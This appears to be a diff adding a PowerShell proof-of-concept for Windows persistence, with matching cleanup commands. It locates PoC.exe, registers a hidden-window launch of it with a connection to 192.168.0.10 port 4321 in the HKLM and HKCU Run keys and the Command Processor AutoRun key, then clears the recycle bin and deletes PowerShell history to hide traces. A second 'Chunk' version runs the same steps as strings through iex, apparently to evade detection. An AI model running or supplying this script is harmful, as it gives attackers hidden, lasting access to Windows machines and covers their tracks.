@@ -1,0 +1,46 @@
+
+Persis
+
+$nd_pth = Get-ChildItem C:\ -Filter PoC.exe -Recurse -ErrorAction SilentlyContinue | % { $_.FullName }
+$ps_pth = (Get-Process -Id $pid).Path
+$cmd = "$ps_pth -windowstyle hidden -c " + "\`"" + $nd_pth + " 192.168.0.10 4321" + "\`""
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v PoC /t REG_SZ /d "$cmd" /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v PoC /t REG_SZ /d "$cmd" /f
+reg add "HKCU\Software\Microsoft\Command Processor" /v PoC /t REG_SZ /d "$cmd" /f
+Clear-RecycleBin -Force
+Remove-Variable * -ErrorAction SilentlyContinue
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+exit
+
+Cleanup 
+
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v PoC /f
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v PoC /f
+reg delete "HKCU\Software\Microsoft\Command Processor" /v PoC /f
+
+Persis Chunk
+
+$a = @(
+    "`$nd_pth = Get-ChildItem C:`\ -Filter PoC.exe -Recurse -ErrorAction SilentlyContinue | % { `$_.FullName }",
+    "`$ps_pth = (Get-Process -Id `$pid).Path",
+    "`$cmd = `"`$ps_pth -windowstyle hidden -c `" + `"\```"`" + `$nd_pth + `" 192.168.0.10 4321`" + `"\```"`"",
+    "reg add `"HKEY_LOCAL_MACHINE`\Software`\Microsoft`\Windows`\CurrentVersion`\Run`" /v PoC /t REG_SZ /d `"`$cmd`" /f",
+    "reg add `"HKEY_CURRENT_USER`\SOFTWARE`\Microsoft`\Windows`\CurrentVersion`\Run`" /v PoC /t REG_SZ /d `"`$cmd`" /f",
+    "reg add `"HKCU`\Software`\Microsoft`\Command Processor`" /v PoC /t REG_SZ /d `"`$cmd`" /f",
+    "Clear-RecycleBin -Force",
+    "Remove-Variable * -ErrorAction SilentlyContinue",
+    "Remove-Item (Get-PSReadlineOption).HistorySavePath"
+); ForEach ($b in $a) {
+    iex $b      
+}
+
+Cleanup Chunk
+
+$a = @(
+    "reg delete `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`" /v PoC /f",
+    "reg delete `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v PoC /f",
+    "reg delete `"HKCU\Software\Microsoft\Command Processor`" /v PoC /f"
+); ForEach ($b in $a) {
+    iex $b      
+}
+
